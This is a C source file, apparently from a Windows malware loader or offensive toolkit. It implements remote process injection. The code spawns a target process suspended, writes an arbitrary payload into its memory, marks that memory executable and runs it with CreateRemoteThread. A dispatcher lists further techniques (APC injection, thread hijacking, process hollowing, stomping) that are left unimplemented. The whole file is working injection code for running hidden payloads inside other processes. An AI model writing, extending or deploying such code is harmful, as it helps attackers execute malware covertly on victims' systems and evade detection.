#include "injection.h"
#include <stdio.h>

BOOL InjectViaCreateRemoteThread(LPVOID payload, SIZE_T size, const TargetProcess* target) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    LPVOID remote_buffer;
    HANDLE hThread;
    DWORD old_protect;

    if (!CreateProcessA(NULL, target->process_name, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("failed to create process: %d\n", GetLastError());
        return FALSE;
    }

    printf("spawned %s (PID: %d)\n", target->process_name, pi.dwProcessId);

    remote_buffer = VirtualAllocEx(pi.hProcess, NULL, size,
                                   MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (remote_buffer == NULL) {
        printf("failed to allocate memory: %d\n", GetLastError());
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    printf("allocated buffer at 0x%p\n", remote_buffer);

    if (!WriteProcessMemory(pi.hProcess, remote_buffer, payload, size, NULL)) {
        printf("failed to write payload: %d\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remote_buffer, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    printf("wrote %zu bytes to remote process\n", size);

    if (!VirtualProtectEx(pi.hProcess, remote_buffer, size, PAGE_EXECUTE_READ, &old_protect)) {
        printf("failed to change memory protection: %d\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remote_buffer, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    printf("changed memory protection to RX\n");

    hThread = CreateRemoteThread(pi.hProcess, NULL, 0,
                                 (LPTHREAD_START_ROUTINE)remote_buffer,
                                 NULL, 0, NULL);
    if (hThread == NULL) {
        printf("failed to create remote thread: %d\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remote_buffer, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    printf("created remote thread (TID: %d)\n", GetThreadId(hThread));

    ResumeThread(pi.hThread);
    CloseHandle(hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return TRUE;
}

BOOL InjectPayload(LPVOID payload, SIZE_T size, const TargetProcess* target, InjectionTechnique technique) {
    switch (technique) {
    case INJECTION_CREATE_REMOTE_THREAD:
        return InjectViaCreateRemoteThread(payload, size, target);

    case INJECTION_APC:
    case INJECTION_THREAD_HIJACKING:
    case INJECTION_PROCESS_HOLLOWING:
    case INJECTION_STOMPING:
        printf("injection technique not implemented\n");
        return FALSE;

    default:
        return FALSE;
    }
}
